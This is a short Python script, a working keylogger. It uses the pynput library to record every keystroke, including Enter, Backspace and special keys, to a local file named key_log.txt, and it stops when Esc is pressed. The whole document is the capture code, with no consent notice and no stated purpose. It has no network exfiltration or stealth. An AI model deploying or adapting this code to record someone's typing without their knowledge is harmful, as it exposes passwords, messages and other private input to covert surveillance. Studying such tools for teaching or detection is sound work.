from pynput.keyboard import Key, Listener

# File to save keystrokes
log_file = "key_log.txt"

# Function to log each keystroke
def on_press(key):
    # Convert key to string and format it
    key = str(key).replace("'", "")  # Remove quotes around the key string
    if key == 'Key.space':
        key = ' '  # Replace 'Key.space' with an actual space character
    elif key == 'Key.enter':
        key = '[ENTER]'  # Replace 'Key.enter' with a [ENTER]
    elif key == 'Key.backspace':
        key = '[BACKSPACE]'  # Indicate a backspace was pressed
    elif key.startswith('Key'):
        key = f'[{key}]'  # Indicate special keys ( Key.ctrl)

    # Append the key to the log file
    with open(log_file, 'a') as f:
        f.write(key)

# Function to stop logging (you can add this as a hotkey)
def on_release(key):
    if key == Key.esc:  # Stop listener if 'Esc' is pressed
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
